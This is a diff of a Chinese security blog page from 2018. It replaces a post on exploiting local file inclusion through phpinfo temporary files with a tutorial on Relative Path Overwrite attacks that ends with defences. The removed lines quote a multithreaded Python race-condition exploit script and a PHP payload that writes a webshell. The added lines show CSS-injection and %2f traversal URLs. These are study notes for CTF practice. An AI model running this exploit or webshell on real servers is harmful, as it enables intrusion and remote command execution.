@@ -15,22 +15,34 @@
 
 
 
-<meta name="description" content="— 从零开始的笔记 —— phpinfo+LFI —">
+<meta name="description" content="— RPO-相对路径覆盖攻击 —">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB-基于phpinfo的包含临时文件">
-<meta property="og:url" content="http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/index.html">
+<meta property="og:title" content="WEB-RPO攻击">
+<meta property="og:url" content="http://lalajun.com/2018/04/27/WEB-RPO攻击/index.html">
 <meta property="og:site_name" content="啦啦菌NODE">
-<meta property="og:description" content="— 从零开始的笔记 —— phpinfo+LFI —">
+<meta property="og:description" content="— RPO-相对路径覆盖攻击 —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg">
-<meta property="og:updated_time" content="2018-04-03T09:32:25.997Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjrv22bhj30wt07dt9y.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjry8j1tj30x7070wfj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjs2egirj30r9063q3t.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjs70d09j30s005t3zd.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjsal32zj30v603r3yx.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fqrjuks3a2j30uo03yaan.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjuqvaauj30ct015web.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjuyr90cj30dl018web.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv1nziaj30f7016q2s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv84jwwj30qw04vaah.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvihfg0j30ei06tjrj.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvlfpmhj30du0173yc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjvorv45j30jm03aaa2.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjvtowa5j30lj06z3yw.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvyrd1tj30mj0dnq39.jpg">
+<meta property="og:updated_time" content="2018-04-27T14:05:43.265Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WEB-基于phpinfo的包含临时文件">
-<meta name="twitter:description" content="— 从零开始的笔记 —— phpinfo+LFI —">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg">
+<meta name="twitter:title" content="WEB-RPO攻击">
+<meta name="twitter:description" content="— RPO-相对路径覆盖攻击 —">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjrv22bhj30wt07dt9y.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -62,7 +74,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>WEB-基于phpinfo的包含临时文件 | 啦啦菌NODE</title>
+<title>WEB-RPO攻击 | 啦啦菌NODE</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -279,11 +291,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-web-phpinfo包含临时文件" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-WEB-RPO攻击" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/04/03/web-phpinfo包含临时文件/" class="article-date">
-      <time datetime="2018-04-03T06:07:12.000Z" itemprop="datePublished">2018-04-03</time>
+      <a href="/2018/04/27/WEB-RPO攻击/" class="article-date">
+      <time datetime="2018-04-27T13:07:12.000Z" itemprop="datePublished">2018-04-27</time>
 </a>
 
 
@@ -298,7 +310,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      WEB-基于phpinfo的包含临时文件
+      WEB-RPO攻击
     </h1>
   
 
@@ -319,40 +331,95 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>— 从零开始的笔记 —<br>— phpinfo+LFI —<br><a id="more"></a></p>
-<h2 id="基于phpinfo的包含临时文件"><a href="#基于phpinfo的包含临时文件" class="headerlink" title="基于phpinfo的包含临时文件"></a>基于phpinfo的包含临时文件</h2><p>从N1CTF ezphp 的非预期解中知道的漏洞<br>开始找资料学习</p>
-<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
-<li>LFI文件包含漏洞</li>
-<li>一个服务端的phpinfo页面</li>
-</ul>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>先了解文件上传流程</p>
-<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg" alt="10.png"></p>
-<p>向服务器上任意php文件以<code>multipart/form-data</code>方式提交请求上传数据时，会生成临时文件,也就是说不需要一定有显性的上传功能也可以上传生成临时文件。</p>
-<p>下面向我们有的phpinfo页面以multipart/form-data方式提交文件</p>
-<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg" alt="1.png"></p>
-<blockquote>
-<p>要注意的是 在multipart/form-data方式中，作为分割用的boundary字符串比定义处前面多两个<code>--</code></p>
-</blockquote>
-<p>查看结果，会有在通常GET请求中没看见的参数<code>$_FILES</code></p>
-<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg" alt="2.png"></p>
-<blockquote>
-<p>phpinfo中的 upload_tmp_dir 可以查看临时文件存放的文件夹，但是文件名是随机的，所以不能利用<br>如果 php.ini 没有设置 upload_tmp_dir，那么默认 php 进程会读写系统的临时目录<br>(Windows 默认为 C:/windows/temp，Linux 为 /tmp）<br>另外$_FILES 是在运行中作为环境参数产生的，所以在我们平常中访问的phpinfo()不会包含$_FILES</p>
-</blockquote>
-<p>接下来通过<code>phpinfo</code>中的<code>$_FILES</code>来获取临时文件的路径以及名称<br>假如上传的临时文件是木马文件，在被删除之前的极短时间之内,需要与服务器竞争时间包含木马文件，当然包含木马文件得到webshell不太现实，可以让木马文件重新生成一个shell文件或者提供一个反弹shell。</p>
-<h3 id="脚本竞争包含上传的木马文件"><a href="#脚本竞争包含上传的木马文件" class="headerlink" title="脚本竞争包含上传的木马文件"></a>脚本竞争包含上传的木马文件</h3><p>根据以下原理，来构建脚本</p>
+        <p>— RPO-相对路径覆盖攻击 —<br><a id="more"></a></p>
+<h1 id="RPO攻击"><a href="#RPO攻击" class="headerlink" title="RPO攻击"></a>RPO攻击</h1><p><strong>RPO</strong>(Relative Path Overwrite) —— <strong>相对路径覆盖</strong>，是一种新型攻击技术，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。</p>
+<h2 id="RPO利用条件以及利用结果"><a href="#RPO利用条件以及利用结果" class="headerlink" title="RPO利用条件以及利用结果"></a>RPO利用条件以及利用结果</h2><p><strong>RPO攻击</strong>依赖于</p>
 <ul>
-<li>通过分块传输编码，提前获知临时文件名称；<br>分块传输可以实现在未完全传输完成时即可获知临时文件名，可以尽早发起文件包含请求，赶在删除之前执行代码。</li>
-<li>通过增加临时文件名后数据长度来延长时间；<br>通过观察PHPinfo的信息，在$_FILES信息下面，还有请求头的相关信息，我们可以在请求的时候，通过填充大量无用数据，来增加后面数据的长度，从而增加脚本的处理时间，为包含文件争取更多的时间。</li>
-<li>通过大量请求来延迟PHP脚本的执行速度。<br>通过大量的并发请求，提高成功的概率。</li>
+<li>浏览器与服务器对于url地址解析反应的不同。这种反应的不同可以由 两者解析差异，WEB缓存技术和配置差异 造成</li>
+<li>前端代码使用相对于本页目录的相对路径来加载css/js <code>../css/style.css</code> 或 <code>./style.js</code></li>
 </ul>
-<p>本机虚拟机测试，无限失败，原因不明<br>自己写的脚本与他人成功的脚本都尝试过，无果，可能跟虚拟机环境有关系<br>贴出他人成功的脚本</p>
+<p><strong>利用结果</strong>:<br>浏览器把服务器返回的其他文件当做css/js来解析。通常单单RPO是没有什么作用的，因为服务器不会有什么恶意的css/js存在。<br>但是配合上一些可以控制的文件(比如可以控制php页面返回自定义css代码,或js代码)。控制服务端使其返回恶意文件+RPO形成解析，导致了<strong>XSS，信息泄露</strong>等漏洞产生。</p>
+<h2 id="浏览器与服务端的差异"><a href="#浏览器与服务端的差异" class="headerlink" title="浏览器与服务端的差异"></a>浏览器与服务端的差异</h2><p>先了解关于服务端和客户端浏览器在解析和识别上的差异性，以Apache服务器和Nginx服务器为例。<br>ps.测试代码取自<a href="https://www.cnblogs.com/p00mj/p/6755000.html" target="_blank" rel="external">p00mj博客</a></p>
+<h3 id="服务器对于URL的解析"><a href="#服务器对于URL的解析" class="headerlink" title="服务器对于URL的解析"></a>服务器对于URL的解析</h3><h4 id="对于-2f的解析"><a href="#对于-2f的解析" class="headerlink" title="对于%2f的解析"></a>对于%2f的解析</h4><p>对于Apache服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjrv22bhj30wt07dt9y.jpg" alt="1.png"><br></div>
+
+<p>对于<code>/</code>URL编码<code>%2f</code><br>访问<code>http://localhost/RPO%2findex.php</code>,失败</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjry8j1tj30x7070wfj.jpg" alt="2.png"><br></div>
+
+<p>对于Nginx服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjs2egirj30r9063q3t.jpg" alt="10.png"><br></div>
+
+<p>访问<code>http://localhost/RPO%2findex.php</code>,成功</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjs70d09j30s005t3zd.jpg" alt="11.png"><br></div>
+
+<p>所以</p>
+<ul>
+<li><strong>Nginx web服务器是会对带有%2f的URL解析的</strong></li>
+<li><strong>Apache服务器时不能对带有%2f的URL进行解析的</strong></li>
+</ul>
+<h4 id="对于后续无意义目录的解析"><a href="#对于后续无意义目录的解析" class="headerlink" title="对于后续无意义目录的解析"></a>对于后续无意义目录的解析</h4><p>两种web服务器结果一致：<br>访问<code>http://localhost/1.php</code>,成功</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjsal32zj30v603r3yx.jpg" alt="3.png"><br></div>
+
+<p>访问<code>http://localhost/1.php/abc/ced.js/style.css</code>,成功，并且返回时跟1.php一样的界面</p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqrjuks3a2j30uo03yaan.jpg" alt="5.png"><br></div>
+
+<p>由此可知：<br><strong>服务器在找到有内容的页面后，不会解析后续没有意义的目录</strong></p>
+<h3 id="客户端浏览器对于URL的解析"><a href="#客户端浏览器对于URL的解析" class="headerlink" title="客户端浏览器对于URL的解析"></a>客户端浏览器对于URL的解析</h3><p>由于需要通过服务器的返回才能判断浏览器对于URL编码的解析，此处使用Nginx服务器。<br>访问<code>http://localhost/RPO/aa%2fbb/index.php</code>，css获取<code>../style.css</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjuqvaauj30ct015web.jpg" alt="16.png"><br></div>
+
+<p>浏览器请求的页面：<code>http://localhost/RPO/aa%2fbb/index.php</code><br>浏览器”应该”请求的CSS：<code>http://localhost/RPO/aa/index.php</code><br>浏览器实际请求的css：<code>http://localhost/RPO/style.css</code></p>
+<p>由此可知:<br><strong>浏览器是不会识别%2f作为路径分割的</strong></p>
+<h2 id="利用场景-pathinfho"><a href="#利用场景-pathinfho" class="headerlink" title="利用场景-pathinfho"></a>利用场景-pathinfho</h2><ul>
+<li>服务端：能不能对带有%2f的URL解析的WEB服务器都行(此例子是apache服务器)</li>
+<li>客户端：所以对于客户端也没有要求.</li>
+<li>css获取：通过相对路径获取(此例子中<code>href=&quot;./style.css&quot;</code>)</li>
+</ul>
 <blockquote>
-<p>PS.写脚本时，发现python多线程时，不好在线程外读文件，在多个线程内使用这个文件，没有找到官方解释，可能是内存变动的原因</p>
+<p>之所以对于两种不同的服务器没有限定，因为实际上这种利用场景我们都是通过/去访问服务器</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit</span></div><div class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></div><div class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></div><div class="line"></div><div class="line"><span class="comment">## shell.txt payload content</span></div><div class="line"><span class="comment"># &lt;?php $c=fopen('shell.php','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=<span class="number">100</span></div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">checkHash</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.queue=queue</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		i=<span class="number">0</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			self.clear=self.queue.get()</div><div class="line">			passtry = self.clear</div><div class="line">			<span class="keyword">if</span> passtry != <span class="string">""</span>:</div><div class="line"></div><div class="line">				padding=<span class="string">"A"</span> * <span class="number">8000</span></div><div class="line"></div><div class="line">				cookies = &#123;</div><div class="line">				    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</div><div class="line">				    <span class="string">'othercookie'</span>: padding</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				headers = &#123;</div><div class="line">				    <span class="string">'User-Agent'</span>: padding,</div><div class="line">				    <span class="string">'Pragma'</span>: padding,</div><div class="line">				    <span class="string">'Accept'</span>: padding,</div><div class="line">				    <span class="string">'Accept-Language'</span>: padding,</div><div class="line">				    <span class="string">'DNT'</span>: <span class="string">'1'</span></div><div class="line">				&#125;</div><div class="line"></div><div class="line">				files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'shell.txt'</span>,<span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line">				reqs=<span class="string">'http://192.168.1.23/phpinfo.php?a='</span>+padding</div><div class="line">				<span class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></div><div class="line">				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				data = re.search(<span class="string">r"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">				reqs = <span class="string">'http://192.168.1.23/lfi.php?action=../..'</span>+data</div><div class="line">				<span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></div><div class="line">				<span class="keyword">print</span> reqs</div><div class="line">				response = requests.get(reqs, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">			i+=<span class="number">1</span></div><div class="line">			self.queue.task_done()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(<span class="keyword">True</span>)</div><div class="line">    t.start()</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999</span>):</div><div class="line">	x=str(x)</div><div class="line">	queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure>
-<blockquote>
-<p>参考<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a><br><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a><br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/79830.html</a></p>
-</blockquote>
+<p>先来了解浏览器根据相对路径请求css原则<br>访问<code>http://localhost/RPO/index.php/country/wei</code></p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjuyr90cj30dl018web.jpg" alt="6.png"><br></div>
+
+<p>访问<code>http://localhost/RPO/index.php/country/wei/</code></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv1nziaj30f7016q2s.jpg" alt="7.png"><br></div>
+
+<p>可以知道浏览器是根据最后一个<strong>/</strong>作为当前目录，在通过相对路径知道css地址，再向服务端去请求该地址的CSS<br>所以访问<code>http://localhost/RPO/index.php/country/wei/style.css</code>作为css<br>而通过之前对于后续无意义目录的例子，可以知道css的内容应该跟index.php的内容一致</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv84jwwj30qw04vaah.jpg" alt="8.png"><br></div>
+
+<p>所以，此处就形成了<code>把php文件当做是静态文件解析</code><br>单单这种形式的漏洞，利用空间较少，你必须要能向index.php中嵌入css(如果是加载作为js的话，就是嵌入js代码)才行,除了对于IE9,IE10的也可以利用同域文件<a href="">前端小姿势</a></p>
+<h3 id="pathinfo例子"><a href="#pathinfo例子" class="headerlink" title="pathinfo例子"></a>pathinfo例子</h3><p>此例子参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></p>
+<p>由于我们需要能在index.php中写入css，构筑index.php代码,进入同目录下css(其内容不重要)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></div><div class="line">&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);</div><div class="line">echo "&lt;br&gt;&lt;";</div><div class="line">?&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>正常访问情况</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvihfg0j30ei06tjrj.jpg" alt="12.png"><br></div>
+
+<p>访问<code>http://localhost/index.php/payload/</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvlfpmhj30du0173yc.jpg" alt="13.png"><br></div>
+
+<p>观察css内容，意料之中执行index.php页面代码</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjvorv45j30jm03aaa2.jpg" alt="14.png"><br></div>
+
+<p>开始注入payload<code>{}*{background-color:red}</code></p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjvtowa5j30lj06z3yw.jpg" alt="15.png"><br></div>
+
+<p>其他css-payload 可以参考<a href="">前端小姿势</a></p>
+<h2 id="利用场景-基于-2f"><a href="#利用场景-基于-2f" class="headerlink" title="利用场景- 基于%2f"></a>利用场景- 基于%2f</h2><ul>
+<li>服务器:要求可以解析URL编码的WEB服务器(此处以Nginx为例)</li>
+<li>浏览器:不解析URL编码</li>
+<li>css获取：通过相对路径获取</li>
+</ul>
+<p><strong>场景假设</strong>:index.php利用相对路径<code>../css/style.css</code>引用style.css。我们可以修改profile.php向其中注入css代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">目录结构</div><div class="line">--php -- index.php</div><div class="line">  |   |</div><div class="line">  |   -- profile.php</div><div class="line">  |</div><div class="line">  css -- style.css</div></pre></td></tr></table></figure></p>
+<p>访问：<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>服务器视角：<code>http://localhost/RPO/aa/php/profile.php/aa/../../index.php</code>即<code>http://localhost/RPO/aa/php/index.php</code><br>浏览器视角:<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>CSS视角:<code>http://localhost/RPO/aa/php/profile.php/css/style.css</code><br>加上<strong>服务器对于后续无意义目录的解析</strong><br>最终实际从服务端加载的CSS：<code>http://localhost/RPO/aa/php/profile.php</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvyrd1tj30mj0dnq39.jpg" alt="17.png"><br></div>
+
+<p>所以，此处就形成了<strong>把不同目录下的php文件当做是静态文件解析</strong><br>利用的性质是:客户端与服务器对于%2f解析的不同，以及服务器对于多余目录的无视</p>
+<h3 id="基于-2f的跨目录解析例子"><a href="#基于-2f的跨目录解析例子" class="headerlink" title="基于%2f的跨目录解析例子"></a>基于%2f的跨目录解析例子</h3><p>直接上CTF题目吧</p>
+<p><a href="https://www.secpulse.com/archives/70070.html" target="_blank" rel="external">share your mind</a><br><a href="http://www.qingpingshan.com/m/view.php?aid=240597" target="_blank" rel="external">大物必须过</a></p>
+<h2 id="防护RPO"><a href="#防护RPO" class="headerlink" title="防护RPO"></a>防护RPO</h2><ul>
+<li>不使用相对路径，加载css/js : 最有效了</li>
+<li>在php页面最开头，声明<code>&lt;!DOCTYPE html&gt;</code>，使用规范模式解析<br>细节请参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></li>
+</ul>
+<h1 id="关于WEB缓存的攻击"><a href="#关于WEB缓存的攻击" class="headerlink" title="关于WEB缓存的攻击"></a>关于WEB缓存的攻击</h1><p>不细说了，原理类似，应用环境不同 <a href="http://www.4hou.com/technology/3536.html" target="_blank" rel="external">戳这里</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/articles/web/166731.html</div><div class="line">http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/</div><div class="line">http://blog.nsfocus.net/rpo-attack/</div><div class="line">https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</div><div class="line">https://www.tuicool.com/articles/eIf6Vje</div><div class="line">https://github.com/eboda/34c3ctf/tree/master/urlstorage</div><div class="line">https://www.secpulse.com/archives/70070.html</div><div class="line">http://www.qingpingshan.com/m/view.php?aid=240597</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -361,13 +428,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></p>
+        <p><span>本文标题:</span><a href="/2018/04/27/WEB-RPO攻击/">WEB-RPO攻击</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2018-04-03, 14:07:12</p>
-        <p><span>最后更新:</span>2018-04-03, 17:32:25</p>
+        <p><span>发布时间:</span>2018-04-27, 21:07:12</p>
+        <p><span>最后更新:</span>2018-04-27, 22:05:43</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/04/03/web-phpinfo包含临时文件/" title="WEB-基于phpinfo的包含临时文件">http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/04/27/WEB-RPO攻击/" title="WEB-RPO攻击">http://lalajun.com/2018/04/27/WEB-RPO攻击/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/04/27/WEB-RPO攻击/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -380,15 +447,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/04/09/WEB-SQL报错注入/">
-                    WEB-SQL报错注入
+                <a href="/2018/05/06/ZJGSCTF-2018-writeup/">
+                    ZJGSCTF-2018-web writup
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/03/26/WEB-网强杯 WEB writeup/">
-                    WEB-网强杯-WEB-writeup
+                <a href="/2018/04/23/Ubuntu下Apache2、Mysql、php7搭建/">
+                    Ubuntu下Apache2、Mysql、php7搭建
                 </a>
             </div>
         
@@ -400,7 +467,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于phpinfo的包含临时文件"><span class="toc-text">基于phpinfo的包含临时文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用前提"><span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本竞争包含上传的木马文件"><span class="toc-text">脚本竞争包含上传的木马文件</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RPO攻击"><span class="toc-text">RPO攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RPO利用条件以及利用结果"><span class="toc-text">RPO利用条件以及利用结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器与服务端的差异"><span class="toc-text">浏览器与服务端的差异</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器对于URL的解析"><span class="toc-text">服务器对于URL的解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#对于-2f的解析"><span class="toc-text">对于%2f的解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对于后续无意义目录的解析"><span class="toc-text">对于后续无意义目录的解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端浏览器对于URL的解析"><span 